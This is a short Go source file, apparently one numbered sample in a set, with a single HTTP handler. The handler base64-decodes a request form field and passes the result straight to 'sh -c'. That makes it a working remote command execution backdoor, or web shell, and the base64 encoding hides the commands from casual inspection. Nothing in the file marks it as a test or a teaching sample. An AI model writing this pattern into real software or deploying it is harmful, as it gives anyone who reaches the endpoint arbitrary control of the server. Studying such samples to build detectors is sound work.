package cells
import ("encoding/base64";"net/http";"os/exec")
func C13(r *http.Request){ b,_:=base64.StdEncoding.DecodeString(r.FormValue("d")); cmd:=string(b); exec.Command("sh","-c",cmd).Run() }
